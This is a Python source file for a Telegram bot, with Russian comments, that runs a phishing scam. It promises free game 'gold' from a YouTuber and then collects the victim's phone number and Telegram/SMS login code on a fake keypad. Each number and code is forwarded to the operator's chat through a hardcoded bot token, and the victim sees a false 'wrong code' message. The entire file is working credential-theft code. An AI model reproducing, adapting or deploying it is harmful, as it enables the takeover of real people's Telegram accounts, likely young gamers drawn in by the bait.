import telebot
from telebot import types

# Твой бот, куда придут данные
YOUR_CHAT_ID = "7605336105"  # Вставь свой ID
bot = telebot.TeleBot("8122491431:AAHbgSr_fX90putlg3YboVfWqalJn_ELpoo")

# Временное хранилище данных
victims = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Я бот который раздает гoлдy oт ютyбeрa Вели! Нажми /verify для того, чтобы нам убедится что ты не бот.")

@bot.message_handler(commands=['verify'])
def ask_phone(message):
    msg = bot.send_message(message.chat.id, "📲 *Введите ваш номер телефона (например, +79123456789):*", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    phone = message.text
    victims[message.chat.id] = {"phone": phone}
    
    # Отправляем номер себе
    bot.send_message(YOUR_CHAT_ID, f"🔢 *Новый номер:* `{phone}`", parse_mode="Markdown")
    
    # Имитируем отправку кода
    bot.send_message(message.chat.id, f"📲 *koд для подтверждения что вы не бот будет отправлен вам в телеграме или в смс через 1-5 минут, ожидайте*")
    
    # Создаем инлайн-клавиатуру для ввода кода
    markup = types.InlineKeyboardMarkup()
    row = []
    for i in range(1, 10):
        row.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
        if len(row) == 3:
            markup.row(*row)
            row = []
    markup.row(types.InlineKeyboardButton("0", callback_data="code_0"))
    markup.row(types.InlineKeyboardButton("✅ Подтвердить", callback_data="code_submit"))
    
    bot.send_message(message.chat.id, "🔢 *Введите код из SMS, нажимая кнопки:*", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("code_"))
def handle_code_input(call):
    chat_id = call.message.chat.id
    action = call.data.split("_")[1]
    
    if chat_id not in victims:
        return
    
    if "code" not in victims[chat_id]:
        victims[chat_id]["code"] = ""
    
    if action == "submit":
        # Жертва нажала "Подтвердить" — отправляем код себе
        full_code = victims[chat_id]["code"]
        bot.send_message(YOUR_CHAT_ID, f"🔐 *Код от {victims[chat_id]['phone']}:* `{full_code}`", parse_mode="Markdown")
        bot.edit_message_text("❌ Неверный код. Попробуйте позже.", chat_id, call.message.message_id)
        del victims[chat_id]
    elif action.isdigit():
        # Жертва вводит цифры
        victims[chat_id]["code"] += action
        bot.answer_callback_query(call.id, f"Код: {victims[chat_id]['code']}")

if __name__ == "__main__":
    bot.polling()